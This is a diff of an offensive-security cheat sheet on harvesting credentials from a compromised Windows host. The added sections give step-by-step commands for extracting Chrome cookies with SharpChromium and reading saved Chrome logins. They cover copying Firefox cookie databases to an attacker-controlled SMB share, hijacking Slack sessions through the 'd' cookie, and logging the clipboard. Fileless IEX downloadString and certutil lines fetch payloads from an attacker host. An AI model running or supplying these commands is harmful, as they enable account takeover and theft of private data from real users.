@@ -241,15 +241,17 @@ runas.exe /savecred /user:'<DOMAIN>\<USER>' <PROCESS>
 
 #### *Browser Credentials*
 
-##### *Retrieving Saved Credentials from Chrome*
-
 > ***e.g. Cookies, Saved Logins and so on***
+
+##### *Chrome*
+
+###### *All stored credentials*
 
 > ***[SharpChrome](https://github.com/GhostPack/SharpDPAPI/tree/master/SharpChrome)***
 
-###### *Setup*
+- ***Setup***
 
-- ***Downloading the binary***
+***Downloading the binary***
 
 > ***From the attacker*** ⚔️
 
@@ -257,7 +259,7 @@ runas.exe /savecred /user:'<DOMAIN>\<USER>' <PROCESS>
 curl --silent --location --request GET --remote-name 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpChrome.exe'
 ```
 
-- ***Transferring it to the target***
+***Transferring it to the target***
 
 > ***From the attacker*** ⚔️
 
@@ -268,8 +270,8 @@ python3 -m http.server 80
 > ***From the target*** 🎯
 
 ```bash
-New-Item -Type Directory -Path "$env:\TEMP\LPE" -Force
-cd "$env:\TEMP\LPE"
+New-Item -Type Directory -Path "$env:TEMP\LPE" -Force
+cd "$env:TEMP\LPE"
 ```
 
 ```bash
@@ -282,7 +284,66 @@ certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SharpChrome.exe'
 .\SharpChrome.exe logins /unprotect
 ```
 
-##### *Retrieving Sensitive Information from Dictionary Files*
+###### *Cookie Extraction*
+
+> ***[SharpChromium](https://github.com/djhohnstein/SharpChromium)***
+
+The *Windows Data Protection API ( **[[DPAPI ABUSE|DPAPI]]** )* encrypts all cookie values stored within a given *SQLITE* file located in the following path
+
+```bash
+%LOCALAPPDATA%\Google\Chrome\UserData\Default\Network\Cookies
+```
+
+Therefore, just as for all information that is encrypted using this mechanism, in order to be able to decrypt it, we must carry out the decryption routine from the session of the user we compromised
+
+- ***Setup***
+
+***Downloading the Powershell Script***
+
+> ***From the attacker*** ⚔️
+
+```bash
+curl --silent --location --request GET --remote-name 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1'
+```
+
+***Copying the Cookie File to the tool's expected location***
+
+> ***From the target*** 🎯
+
+```bash
+Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+```
+
+***Transferring it to the target***
+
+> ***Fileless***
+
+> ***From the attacker*** ⚔️
+
+```bash
+python3 -m http.server 80
+```
+
+> ***From the target*** 🎯
+
+```bash
+IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/Invoke-SharpChromium.ps1)
+```
+
+- ***Usage***
+
+```bash
+Invoke-SharpChromium -Command 'cookies <HOST>'
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> Invoke-SharpChromium -Command 'cookies slack.com'
+> ```
+>
+
+###### *Sensitive Information Extraction from Dictionary Files*
 
 > ***e.g. Google Chrome Custom Dictionary***
 
@@ -290,6 +351,115 @@ certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SharpChrome.exe'
 
 ```bash
 Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Custom Dictionary.txt" | Select-String -Pattern '(passwd|pass|key|token)'
+```
+
+##### *Firefox*
+
+###### *Cookie Extraction*
+
+> ***Firefox Cookies' Path***
+
+```bash
+%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite
+```
+
+Unlike ***[[#Chrome#Cookie Extraction|Chrome]]***, *Firefox* does not use any kind of encryption to protect the *SQLITE* database where cookies are stored, so we can proceed as follows to retrieve all of them
+
+- ***Setting up an SMB Server***
+
+> ***From the attacker*** ⚔️
+
+```bash
+smbserver.py -smb2support -user '<USER>' -passwd '<PASSWD>' '<SHARE>' '<LOCAL_PATH>'
+```
+
+> ***From the target*** 🎯
+
+```bash
+net use X: "\\<ATTACKER_IP>\<SHARE>" /USER:<USER> '<PASSWD>'
+```
+
+- ***Copying Firefox Cookie Database***
+
+> ***From the target*** 🎯
+
+```bash
+Copy-Item -Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" -Destination 'X:'
+```
+
+- ***Downloading the Powershell Script***
+
+> ***From the attacker*** ⚔️
+
+```bash
+curl --silent --location --request GET --remote-name 'https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py'
+```
+
+- ***Running the script above***
+
+```bash
+python3 cookieextractor.py --dbpath '<SQLITE_COOKIE_FILE>' --host discord
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> python3 cookieextractor.py --dbpath ./cookies.sqlite --host slack
+> ```
+>
+
+---
+
+#### *IM Clients*
+
+> ***Instant Messaging***
+
+##### *Slack*
+
+If the given account is using some sort of *2FA* or we just do not know the credentials, we can try to steal the user's cookies to log in to the ***[cloud-based client](https://slack.com/signin#/signin)***
+
+This platform sets to any logged-in user a cookie named *d*, whose value stores the user's authentication token
+
+So, if we manage to retrieve this cookie by performing ***[[#Browser Credentials|Browser Credential Extraction]]***, we could authenticate as the given user account against this platform
+
+---
+
+#### *User's Clipboard*
+
+##### *Real-time Monitoring*
+
+> ***[Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1)***
+
+###### *Setup*
+
+- ***Downloading the Powershell Script***
+
+> ***From the attacker*** ⚔️
+
+```bash
+curl --silent --location --request GET --remote-name 'https://github.com/inguardians/Invoke-Clipboard/raw/refs/heads/master/Invoke-Clipboard.ps1'
+```
+
+- ***Transferring it to the target***
+
+> ***Fileless***
+
+> ***From the attacker*** ⚔️
+
+```bash
+python3 -m http.server 80
+```
+
+> ***From the Target*** 🎯
+
+```bash
+IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/Invoke-Clipboard.ps1)
+```
+
+###### *Usage*
+
+```bash
+Invoke-ClipboardLogger
 ```
 
 ---
@@ -423,6 +593,8 @@ Invoke-SelfSearch -Mailbox '<USER>@<DOMAIN>'
 ---
 
 #### *Credentials on Windows Registry*
+
+> ***See [[WINDOWS AUTOLOGON|Windows Autologon]]***
 
 ##### *Windows Autologon Credentials*
 
@@ -589,7 +761,7 @@ python3 -m http.server 80
 > ***From the target*** 🎯
 
 ```bash
-IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/SessionGopher.ps1)
+IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/SessionGopher.ps1')
 ```
 
 ###### *Usage*
@@ -628,7 +800,7 @@ python3 -m http.server 80
 
 ```bash
 New-Item -Type Directory -Path "$env:TEMP\LPE" -Force
-cd "$env:\TEMP\LPE"
+cd "$env:TEMP\LPE"
 ```
 
 ```bash
